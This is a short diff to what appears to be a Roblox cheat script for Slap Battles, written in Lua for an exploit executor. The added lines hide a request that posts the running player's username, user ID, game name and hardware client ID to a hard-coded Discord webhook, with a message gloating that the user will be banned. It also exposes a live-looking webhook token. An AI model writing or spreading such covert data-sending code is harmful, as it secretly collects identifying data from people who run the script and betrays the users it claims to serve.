@@ -28,6 +28,35 @@ if game:GetService("ReplicatedStorage"):FindFirstChild("WalkSpeedChanged") then
     end
   end
   return
+  local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+HttpService = game:GetService("HttpService")
+Webhook_URL = "https://discord.com/api/webhooks/1231633572453158994/Tbkl1CKYn1KECBNIGul_ZPOtkJ5MoIQJnUm8IzuwPU1wRtugLQepqXznD873nj-bPqjt"
+
+local responce = syn.request(
+{
+    Url = Webhook_URL,
+    Method = 'POST',
+    Headers = {
+        ['Content-Type'] = 'application/json'
+    },
+    Body = HttpService:JSONEncode({
+        ["content"] = "# ▬▬▬▬▬▬▬▬",
+        ["embeds"] = {{
+            ["title"] = "**Your Script For Slap Battles Has Been Executed!**",
+            ["description"] = "**"..game.Players.LocalPlayer.Name.. "** *with Id* **"..game.Players.LocalPlayer.UserId.. "** *has executed your script in* **"..GameName.."** *And Get Banned!*",
+            ["type"] = "rich",
+            ["color"] = tonumber(0x21db46),
+            ["fields"] = {
+                {
+                    ["name"] = "Hardware ID:",
+                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                    ["inline"] = true
+                }
+            }
+        }}
+    })
+}
+)
 end
 
 local qOT = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
